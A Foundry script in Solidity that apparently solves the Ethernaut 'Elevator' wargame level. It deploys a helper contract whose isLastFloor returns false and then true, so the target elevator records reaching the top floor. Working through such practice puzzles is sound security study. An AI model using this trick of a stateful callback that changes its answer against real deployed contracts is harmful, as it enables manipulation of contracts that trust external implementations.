// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Elevator} from "../src/Elevator.sol";
import {Script, console} from "forge-std/script.sol";

contract ElevatorSolution is Script {
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        MyBuilding myBuilding = new MyBuilding();
        myBuilding.startAttack();
        vm.stopBroadcast();
    }
}

contract MyBuilding {
    Elevator elevator = Elevator(0x89Ac4dA03450449d2f8706B132e1DA7F9F1b7dAC);
    bool private mySwitch;

    function startAttack() public {
        elevator.goTo(0);
    }

    function isLastFloor(uint256 _floor) public returns (bool) {
        if (!mySwitch) {
            mySwitch = true;
            return false;
        } else {
            return true;
        }
    }
}
